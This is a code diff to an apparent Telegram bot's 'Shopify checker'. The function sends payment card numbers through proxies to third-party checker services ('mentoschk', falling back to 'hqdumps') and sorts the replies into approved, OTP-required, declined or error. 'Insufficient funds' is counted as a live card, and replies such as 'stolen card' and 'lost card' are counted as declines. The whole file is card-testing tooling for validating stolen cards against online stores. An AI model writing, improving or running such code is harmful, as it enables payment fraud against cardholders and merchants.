@@ -167,16 +167,14 @@ def validate_proxies_strict(proxies, bot, message):
 # 🔧 SHOPIFY CHECKER WITH FALLBACK + ENHANCED RESPONSE MAPPING
 # ============================================================================
 def check_site_shopify_direct(site_url, cc, proxy=None):
-    """
-    Tries mentoschk.com API first, then falls back to hqdumps.com if needed.
-    Returns a dictionary with 'Response', 'status', 'gateway', 'price', 'message'.
-    """
     import urllib.parse
+    import requests
+    import re
 
-    # --- Helper to call a specific API ---
-    def call_api(api_base, api_key=None):
+    def call_api(api_base):
         try:
             clean_site = site_url.rstrip('/')
+            # Format proxy as host:port:user:pass
             api_proxy = ""
             if proxy:
                 proxy = proxy.strip()
@@ -189,7 +187,7 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
                         user, password, host, port = match.groups()
                         api_proxy = f"{host}:{port}:{user}:{password}"
                 elif len(parts) == 2:
-                    api_proxy = proxy
+                    api_proxy = proxy  # host:port only
 
             encoded_cc = urllib.parse.quote(cc)
             encoded_proxy = urllib.parse.quote(api_proxy) if api_proxy else ""
@@ -207,31 +205,41 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
             session = requests.Session()
             session.verify = False
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            response = session.get(url, headers=headers, timeout=60)
+            response = session.get(url, headers=headers, timeout=90)  # Increased timeout
 
             if response.status_code != 200:
+                print(f"[API] {api_base} returned {response.status_code}")
                 return None
 
             data = response.json()
+            print(f"[API] {api_base} raw response: {data}")  # Debug print
 
+            # Normalize response to a common format
             if api_base == "mentoschk":
+                # Example: {"Gateway":"...","Price":...,"Response":"...","Status":...}
                 return {
                     'Response': data.get('Response', 'Unknown'),
                     'Price': str(data.get('Price', '0.00')),
                     'Gateway': data.get('Gateway', 'Shopify API'),
                     'Status': data.get('Status', False)
                 }
-            else:
+            else:  # hqdumps
+                # Example: {"Response":"Card_Declined","Price":"1.0","Gate":"Shopify Payments",...}
+                # Note: hqdumps may not have a "Status" field – infer from Response text
+                resp_text = data.get('Response', 'Unknown')
+                # Assume Status True if response not explicitly an error
+                status = False if 'UNABLE' in resp_text.upper() or 'FAILED' in resp_text.upper() else True
                 return {
-                    'Response': data.get('Response', 'Unknown'),
+                    'Response': resp_text,
                     'Price': str(data.get('Price', '0.00')),
-                    'Gateway': data.get('Gateway', 'Shopify API'),
-                    'Status': data.get('Status', False)
+                    'Gateway': data.get('Gate', 'Shopify API'),
+                    'Status': status
                 }
-        except Exception:
+        except Exception as e:
+            print(f"[API] {api_base} exception: {e}")
             return None
 
-    # Try primary, then secondary
+    # Try primary
     result = call_api("mentoschk")
     if result is None:
         result = call_api("hqdumps")
@@ -251,35 +259,19 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
     status_bool = result['Status']
     response_upper = response_text.upper()
 
-    # ----- Enhanced mapping based on observed responses -----
-    # Define keywords for each status
-    approved_keywords = [
-        'THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS',
-        'INSUFFICIENT FUNDS', 'INSUFFICIENT_FUNDS'   # treat as live
-    ]
-    approved_otp_keywords = [
-        '3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE'
-    ]
-    declined_keywords = [
-        'CARD DECLINED', 'DECLINED', 'EXPIRED_CARD', 'EXPIRED',
-        'FRAUD', 'SUSPECTED', 'INCORRECT CVC', 'INCORRECT_CVC',
-        'INCORRECT ZIP', 'INCORRECT_ZIP', 'INCORRECT NUMBER', 'INCORRECT_NUMBER',
-        'INVALID NUMBER', 'DO NOT HONOR', 'PICKUP', 'LOST CARD', 'STOLEN CARD',
-        'AMOUNT TOO SMALL', 'AMOUNT_TOO_SMALL'
-    ]
-    # Responses that indicate a permanent problem with the card or site (should be DECLINED, not ERROR)
-    # We'll treat them as DECLINED as well
-    extra_declined = [
-        'SUBMIT REJECTED', 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT',
-        'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE',
-        'PAYMENTS_CREDIT_CARD_SESSION_ID'
-    ]
-    # Responses that are likely transient (tokenization issues, site dead) – keep as ERROR
-    error_keywords = [
-        'FAILED TO TOKENIZE CARD', 'SITE DEAD', 'GENERIC_ERROR',
-        'DEAD/TIMEOUT', 'TIMEOUT', 'PROXY', 'UNABLE TO GET PAYMENT TOKEN',
-        'CART ADD FAILED', 'SUBMIT FAILED', 'RECHECK', 'INCORRECT',  # maybe some 'INCORRECT' are permanent? we already covered specific ones above
-    ]
+    # --- Enhanced mapping (same as before) ---
+    approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS', 'INSUFFICIENT_FUNDS']
+    approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
+    declined_keywords = ['CARD DECLINED', 'DECLINED', 'EXPIRED_CARD', 'EXPIRED', 'FRAUD', 'SUSPECTED',
+                         'INCORRECT CVC', 'INCORRECT_CVC', 'INCORRECT ZIP', 'INCORRECT_ZIP',
+                         'INCORRECT NUMBER', 'INCORRECT_NUMBER', 'INVALID NUMBER', 'DO NOT HONOR',
+                         'PICKUP', 'LOST CARD', 'STOLEN CARD', 'AMOUNT TOO SMALL', 'AMOUNT_TOO_SMALL']
+    extra_declined = ['SUBMIT REJECTED', 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT',
+                      'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE',
+                      'PAYMENTS_CREDIT_CARD_SESSION_ID']
+    error_keywords = ['FAILED TO TOKENIZE CARD', 'SITE DEAD', 'GENERIC_ERROR', 'DEAD/TIMEOUT',
+                      'TIMEOUT', 'PROXY', 'UNABLE TO GET PAYMENT TOKEN', 'CART ADD FAILED',
+                      'SUBMIT FAILED', 'RECHECK']
 
     if any(k in response_upper for k in approved_keywords):
         status = 'APPROVED'
@@ -290,11 +282,7 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
     elif any(k in response_upper for k in error_keywords):
         status = 'ERROR'
     else:
-        # If Status is False, treat as ERROR; if True but unknown response, DECLINED as fallback
-        if status_bool is False:
-            status = 'ERROR'
-        else:
-            status = 'DECLINED'
+        status = 'ERROR' if status_bool is False else 'DECLINED'
 
     return {
         'Response': response_text,
@@ -1182,6 +1170,7 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
         except:
             bot.send_message(chat_id, msg, parse_mode='HTML')
+
 
 
 
